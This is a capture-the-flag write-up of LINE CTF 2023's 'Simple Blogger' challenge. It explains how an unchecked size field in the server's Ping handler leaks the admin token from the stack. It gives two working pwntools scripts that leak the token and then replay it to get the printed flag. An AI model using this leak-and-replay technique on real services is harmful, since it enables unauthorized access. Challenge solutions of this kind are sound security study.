---
layout: post
title: (CTF) LINE CTF 2023 writeup
categories: [Writeup]
tags : [writeup, CTF, LINECTF]
date : 2023-03-30 22:22:00 +0900
toc: true
comments: false
mermaid: false
math: false
author : Inseo An
---

# LINECTF 2023
## Simple Blogger
- This Challenge has two binary client_nix, server_nix 
### Client_nix
Client_nix provides several menus including Ping, login, logout and flag...

### Server_nix
Server_nix processes client input and sends a response to client 

The Vulnerability is in Ping function.

- Background Knowledge
    - the data struct that client send to server is simply below

        ``` python
        Struct data{
        # offset : name (size)
        0: success_flag (1)
        1: option_num (1)
        2: token (16)
        18: size_bigendian (2)
        - custom data
        20 ~ : Data
        }
        ```

    - the opposite is

        ``` python
        Struct data{
        # offset : name (size)
        0: success_flag (1)
        1: undefined (1)
        2: size (2)
        - custom data
        4 ~ : Data
        }
        ```

If client runs 'Ping', client receives 'Pong'

![1](https://i.imgur.com/sAOHhQc.png)

The detail process step is as follows:
1. Client send data below

    ```
    data = b'\x01\x01'
    data += b'\x00'*0x10
    data += b'\x00\x04'
    data += b'PING'
    ```

2. Server receives data, processes with them

2-1. Generally follow below logic save data to temp buffer
    ![2](https://i.imgur.com/97Vcc4l.png)
    The important element is
    
    ```
    a2+0x18 = size;
    ```

    2-2. And Call Ping Function
    ![3](https://i.imgur.com/MqfeG4e.png)

    (v9 == a2)
    sub_4025DC is Ping function, the 7th argument is size saved at the above logic
    2-3. Memcpy and return
    ![4](https://i.imgur.com/Y58G4a4.png)
    (sub_4013F6 is send response function, a7 == 7th argument )
    In the function, move data to response buffer via memcpy. Because the size using memcpy is a7, then can leak stack data. The admin token loaded from the above sql api exists in stack. 
    
4. Server sends a response to client   

    ```
    data = b'\x01'
    data += b'\x00\x04'
    data += b'PONG'
    ```

4. Client puts 'PONG'

---
Exploit code is below
- token leak

    ```python
    from pwn import *
    import struct, os, binascii

    HOST = '34.146.54.86'
    PORT = 10007
    TIMEOUT = 3

    def extract_sess(auth_res):
        sess = auth_res[4:]
        return sess

    def clear_db():
        payload = b'\x01\x01'
        payload += b'a'*0x10
        payload += b'\x03\x04'
        payload += b'PING'
        return payload

    def connect(payload):
        r = remote(HOST, PORT)
        r.send(payload)
        data = r.recvrepeat(TIMEOUT)
        r.close()
        return data

    r = remote(HOST, PORT)
    r.send(clear_db())
    r.recvuntil("PONG")
    data = r.recvrepeat(TIMEOUT)
    r.close()
    print(binascii.hexlify(data[:16]), end="")
    ```
    
- auth and get flag

    ```python
    from pwn import *
    import struct, os, binascii

    HOST = '34.146.54.86'
    PORT = 10007
    TIMEOUT = 3

    def extract_sess(auth_res):
        sess = auth_res[4:]
        return sess

    def clear_db():
        payload = b'\x01\x01'
        payload += b'a'*0x10
        payload += b'\x03\x04'
        payload += b'PING'
        return payload

    def connect(payload):
        r = remote(HOST, PORT)
        r.send(payload)
        data = r.recvrepeat(TIMEOUT)
        r.close()
        return data

    r = remote(HOST, PORT)
    token1 = 0x9649dac3db7f5cd3
    token2 = 0xe950d705b03a91c2
    payload = b'\x01\x06'
    payload += p64(token1,endian="big")
    payload += p64(token2,endian="big")
    payload += b'\x03\x04'
    payload += b'PING'
    r.send(payload)
    data = r.recvrepeat(TIMEOUT)
    r.close()
    print(data)
    ```

![5](https://i.imgur.com/mTkomoj.png)

`LINECTF{2b9598e3eca50122436702e10877cdce}`

---